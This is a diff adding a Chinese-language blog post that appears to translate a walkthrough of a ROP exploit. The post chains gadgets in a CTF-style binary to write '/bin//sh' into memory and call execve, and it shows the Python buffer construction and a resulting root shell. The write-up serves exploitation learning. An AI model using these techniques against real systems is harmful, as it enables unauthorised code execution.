@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="为了用sys_execve syscall执行&#x2F;bin&#x2F;sh，需要解决一些障碍，根据参考，需要设置寄存器如下; EAX &#x3D; 11 (or 0x0B in hex) – The execve syscall numberEBX &#x3D; Address in memory of the string “&#x2F;bin&#x2F;sh”ECX &#x3D; Add">
+<meta property="og:type" content="article">
+<meta property="og:title" content="A Simple ROP Exploit &#x2F;bin&#x2F;sh via syscall">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/09/14/bin-sh-via-syscall/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="为了用sys_execve syscall执行&#x2F;bin&#x2F;sh，需要解决一些障碍，根据参考，需要设置寄存器如下; EAX &#x3D; 11 (or 0x0B in hex) – The execve syscall numberEBX &#x3D; Address in memory of the string “&#x2F;bin&#x2F;sh”ECX &#x3D; Add">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bin-sh-via-syscall.jpg">
+<meta property="article:published_time" content="2021-09-14T10:44:50.000Z">
+<meta property="article:modified_time" content="2021-09-15T02:55:25.479Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bin-sh-via-syscall.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/09/14/bin-sh-via-syscall/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/09/14/bin-sh-via-syscall/","path":"2021/09/14/bin-sh-via-syscall/","title":"A Simple ROP Exploit /bin/sh via syscall"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>A Simple ROP Exploit /bin/sh via syscall | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E9%9D%A2%E7%9A%84%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">后面的工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Gadgets"><span class="nav-number">2.</span> <span class="nav-text">Gadgets</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E5%86%99%E5%86%85%E5%AD%98"><span class="nav-number">3.</span> <span class="nav-text">可写内存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#String-Write-1"><span class="nav-number">5.</span> <span class="nav-text">String Write 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#String-Write-2"><span class="nav-number">6.</span> <span class="nav-text">String Write 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Address-Write"><span class="nav-number">7.</span> <span class="nav-text">Address Write</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zero-EDX"><span class="nav-number">8.</span> <span class="nav-text">Zero EDX</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-number">9.</span> <span class="nav-text">设置寄存器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execve-Syscall"><span class="nav-number">10.</span> <span class="nav-text">Execve Syscall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%90%E8%A1%8Cexploit"><span class="nav-number">11.</span> <span class="nav-text">运行exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-%E8%AF%91"><span class="nav-number">12.</span> <span class="nav-text">参考链接(译)</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/09/14/bin-sh-via-syscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="A Simple ROP Exploit /bin/sh via syscall | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          A Simple ROP Exploit /bin/sh via syscall
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-09-14 18:44:50" itemprop="dateCreated datePublished" datetime="2021-09-14T18:44:50+08:00">2021-09-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-09-15 10:55:25" itemprop="dateModified" datetime="2021-09-15T10:55:25+08:00">2021-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>为了用sys_execve syscall执行&#x2F;bin&#x2F;sh，需要解决一些障碍，根据参考，需要设置寄存器如下;</p>
+<p>EAX &#x3D; 11 (or 0x0B in hex) – The execve syscall number<br>EBX &#x3D; Address in memory of the string “&#x2F;bin&#x2F;sh”<br>ECX &#x3D; Address of a pointer to the string “&#x2F;bin&#x2F;sh”<br>EDX &#x3D; Null (可选的指向描述环境的结构的指针)</p>
+<p>一旦所有这些都设置好了，执行int 0x80指令应该会生成一个shell。</p>
+<span id="more"></span>
+
+<h2 id="后面的工作"><a href="#后面的工作" class="headerlink" title="后面的工作"></a>后面的工作</h2><p>从想要的开始, 一次性链接一起解决问题, 直到已经完成了利用链, ROP exploitation的本质是解决一个问题常常引入另一个, 所以它重要, 集中和逻辑, 总是寻找不同的路线和替代解决方案。</p>
+<p>首先需要的是放置&#x2F;bin&#x2F;sh字符串的地方，还需要一种方法将这个字符串写入这个选择的位置，以及一个包含指向这个位置的指针的内存地址。还需要能够向EDX写入空值(这通常是有问题的)，并向EAX、EBX和ECX写入任意值。最后，需要一个int 0x80指令。</p>
+<h2 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h2><p>可以用gadget的二进制, gadget是一个有用的ret指令, ret指令是至关重要的, 因为这是允许链接多个gadgets连接到一个链, 然后执行流, 返回从一个指令。如果exploit是一条链那么每个gadget都是链中的一环。</p>
+<p>有许多工具可以简化寻找gadget和构建ROP链的过程，但暂时不考虑这些工具，而是自己动手，以确保对整个过程有一个很好的理解。</p>
+<p>虽然正在看的二进制文件相当小，但它包含了很多gadgets，包括一个可疑的密集指令区域，看起来就像是故意构建的。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bin-sh-via-syscall.jpg"></li>
+</ul>
+<p>这部分内存包含了需要的所有东西——从将数据从堆栈中弹出到EAX、EBX、ECX和EDX的gadget开始。如果控制了堆栈，那么就可以设置这些寄存器的值。</p>
+<p>例如，从0x08048225开始的指令是pop %eax; ret，这个gadget获取堆栈顶部的任意4个字节，并将它们放入EAX寄存器，对堆栈指针加1，然后返回到下一个地址。为了使用它，将以下内容放入链中;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x08048225][&lt;Value to put into EAX&gt;][&lt;Next Gadget&gt;] ...</span><br></pre></td></tr></table></figure>
+
+<p>还有gadget xor %edx,%edx; ret — 如果不能在漏洞中发送空字节，这将非常方便，因为已经知道需要将EDX设置为0。对寄存器自身进行0. XORing是使其归零的常用方法。</p>
+<p>接下来，就得到了一个真正强大的工具 - 在0x0804822F的gadget是 mov %eax, (%edx); ret 将获取EAX中的任何内容，并将其复制到EDX中的地址所在的内存位置，因为可以将其与前面的gadget链接起来，以控制EAX和EDX的值，这就形成了write-what-where原语。</p>
+<p>最后，可以在0x8048210找到一个int 0x80; ret gadget</p>
+<h2 id="可写内存"><a href="#可写内存" class="headerlink" title="可写内存"></a>可写内存</h2><p>着手将想要执行的命令的字符串写进程序的内存中。可以通过 objdump -x 找到一个合适的可写内存部分</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 .bss 0000001c 0804a000 0804a000 00001000 2**2</span><br><span class="line">ALLOC</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，这个内存位置在最不重要的位置包含一个空字节，如果需要，可以添加一个小偏移量来避免这种情况，比如0x0804A004</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>这是大量的<span class="exturl" data-url="aHR0cHM6Ly9mYWlsaW5nc2lsZW50bHkud29yZHByZXNzLmNvbS8yMDE3LzEyLzE0L2Jpbi1zaC1yb3AtZXhwbG9pdC8=">准备工作<i class="fa fa-external-link-alt"></i></span>，现在可以开始编写exploit了。正如在开始时提到的，为了获得最大的可读性，布局代码非常重要，所以要做的第一件事是为所有gadget提供可读的名称，并定义一个函数address()来进行小端地址转换。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pop_eax = 0x08048225</span><br><span class="line">pop_ebx = 0x08048227</span><br><span class="line">pop_ecx = 0x08048229</span><br><span class="line">pop_edx = 0x0804822B</span><br><span class="line">zero_edx = 0x08048220</span><br><span class="line">writewhatwhere = 0x0804822f</span><br><span class="line">execute_syscall = 0x08048210</span><br><span class="line"> </span><br><span class="line">def address(data):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&quot;&amp;lt;L&quot;</span>, data)</span><br></pre></td></tr></table></figure>
+
+<p>还需要设置变量来保存可写内存地址，想放在那里的字符串，要放入64字节中的填充，最后是要覆盖EBP的垃圾值。因为这不会影响利用，它是一个小细节，但它有助于安排一切有条不紊。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">writable_memory=0x0804a010   <span class="comment"># .bss section is writable</span></span><br><span class="line">padding = <span class="string">&quot; &quot;</span>                <span class="comment"># we&#x27;ll use spaces as padding</span></span><br><span class="line">text = <span class="string">&quot;A shell\n\n\n&quot;</span>       <span class="comment"># Flavor text</span></span><br><span class="line">EBPoverwrite = <span class="string">&quot;AAAA&quot;</span>        <span class="comment"># Bytes to overwrite EBP</span></span><br></pre></td></tr></table></figure>
+
+<p>知道在利用缓冲区中控制了68字节的EIP，因此可以用64字节 + 4字节构建缓冲区的第一部分来覆盖EBP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buffer = text + padding * (64 - len(text))</span><br><span class="line">buffer += EBPoverwrite</span><br></pre></td></tr></table></figure>
+
+<h2 id="String-Write-1"><a href="#String-Write-1" class="headerlink" title="String Write 1"></a>String Write 1</h2><p>利用缓冲区中接下来的4个字节是设置EIP的第一个值，也是ROP链的开始。第一个任务是使用write-what-where函数将字符串 “&#x2F;bin&#x2F;sh” 放入内存，作为syscall的参数1，第一步是将要写入的值放入EAX。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buffer += address(pop_eax) <span class="comment"># place value into EAX</span></span><br><span class="line">buffer += <span class="string">&quot;/bin&quot;</span>           <span class="comment"># 4 bytes at a time</span></span><br></pre></td></tr></table></figure>
+
+<p>当执行pop EAX gadget时，ESP将指向下一个4字节的字，即对应于ascii字符串 “&#x2F;bin” 的字节。<br>下一步是使用pop edx gadget将想要写入的地址放入edx中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buffer += address(pop_edx)         <span class="comment"># place value into edx</span></span><br><span class="line">buffer += address(writable_memory)</span><br></pre></td></tr></table></figure>
+
+<p>在这里使用address函数将字节重新排序为小的端序，因为两者都是内存地址。<br>最后，调用 mov %eax, (%edx) gadget来写内存</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer += address(writewhatwhere)</span><br></pre></td></tr></table></figure>
+
+<h2 id="String-Write-2"><a href="#String-Write-2" class="headerlink" title="String Write 2"></a>String Write 2</h2><p>现在重复这个过程，将字符串的下一个4个字节写入内存。从技术上讲，只剩下3个字节可以写入，但可以稍微作弊一下，因为多个&#x2F;字符会被execve忽略。写 “&#x2F;&#x2F;sh” 需要更新EDX以添加 +4 偏移量，并更改EAX中的值。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">buffer += address(pop_eax)</span><br><span class="line">buffer += <span class="string">&quot;//sh&quot;</span></span><br><span class="line">buffer += address(pop_edx)</span><br><span class="line">buffer += address(writable_memory + 4)</span><br><span class="line">buffer += address(writewhatwhere)</span><br></pre></td></tr></table></figure>
+
+<p>字符串需要以空结束，在这里写入的内存被初始化为0，所以在这种情况下不需要担心，但它值得记住。</p>
+<h2 id="Address-Write"><a href="#Address-Write" class="headerlink" title="Address Write"></a>Address Write</h2><p>现在需要的字符串在内存中，还需要向内存中写入指向它的指针。这是write-what-where原语的另一种用法。注意，写的偏移量是+12而不是+8，因为需要null结束字符串，不能把指针写在它旁边，需要有一个小的间隙。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write the address containing /bin/sh string into memory</span></span><br><span class="line">buffer += address(pop_eax)</span><br><span class="line">buffer += address(writable_memory)</span><br><span class="line">buffer += address(pop_edx)</span><br><span class="line">buffer += address(writable_memory + 12)</span><br><span class="line">buffer += address(writewhatwhere)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Zero-EDX"><a href="#Zero-EDX" class="headerlink" title="Zero EDX"></a>Zero EDX</h2><p>需要的第三个参数存储在EDX中，应该是0x00000000。可以使用pop_edx gadget将空值移动到寄存器中，在这种情况下，这很好，因为可以在exploit中写入空值。或者，可以使用 xor %edx, %edx gadget，这是一种更通用的方法，因为0x00经常是一个坏字符。现在已经完成了write-what-where的使用，不再需要它了，所以是时候将它归零了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buffer += address(zero_edx)</span><br></pre></td></tr></table></figure>
+
+<h2 id="设置寄存器"><a href="#设置寄存器" class="headerlink" title="设置寄存器"></a>设置寄存器</h2><p>现在是为syscall准备EBX和ECX的时候了，这是很容易做到的，因为两者都是内存位置;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">buffer += address(pop_ebx)</span><br><span class="line">buffer += address(writable_memory)          <span class="comment"># location of string /bin/sh</span></span><br><span class="line"> </span><br><span class="line">buffer += address(pop_ecx)</span><br><span class="line">buffer += address(writable_memory + 12)     <span class="comment"># address of pointer to /bin/sh</span></span><br></pre></td></tr></table></figure>
+
+<p>最后一个参数是需要放入EAX中的syscall number。同样，0x0000000B包含空字节，这可能导致一些问题是利用。可能有必要(例如)将寄存器置零，并将其增加到11，以避免坏字符，或其他一些更迂回的设置寄存器的方法。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buffer += address(pop_eax)</span><br><span class="line">buffer += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, 0x0000000B)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Execve-Syscall"><a href="#Execve-Syscall" class="headerlink" title="Execve Syscall"></a>Execve Syscall</h2><p>现在该执行执行syscall了。现在正确设置了call的所有参数，这非常简单。还在这里完成了exploit，打印正在构建的缓冲区的内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buffer += address(execute_syscall)</span><br><span class="line"><span class="built_in">print</span>(buffer)</span><br></pre></td></tr></table></figure>
+
+<h2 id="运行exploit"><a href="#运行exploit" class="headerlink" title="运行exploit"></a>运行exploit</h2><p>在测试中，可以看到shell按照预期创建，但是当主机程序关闭时，它会立即关闭。这带来了一些问题，直到一个朋友指出，这是一个众所周知的常见问题，很容易通过使用cat保持输入管道打开来解决;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python exploit.py &gt; exploit</span></span><br><span class="line">root@kali:~<span class="comment"># (cat exploit; cat) | ./binary_challenge</span></span><br><span class="line">Show me what you’ve got</span><br><span class="line">:&gt;You’ve got: A shell</span><br><span class="line">AAAA%�/bin+�</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>好了，一个适用于简单缓冲区溢出的ROP exploit。这是一个很有趣的挑战，在完成它的过程中学到了很多。希望本walkthrough对您的学习有用，并&#x2F;或有趣。</p>
+<h2 id="参考链接-译"><a href="#参考链接-译" class="headerlink" title="参考链接(译)"></a>参考链接(译)</h2><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9mYWlsaW5nc2lsZW50bHkud29yZHByZXNzLmNvbS8yMDE3LzEyLzE0L3JvcC1jaGFpbi1zaGVsbC8=">A Simple ROP Exploit – &#x2F;bin&#x2F;sh via syscall<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
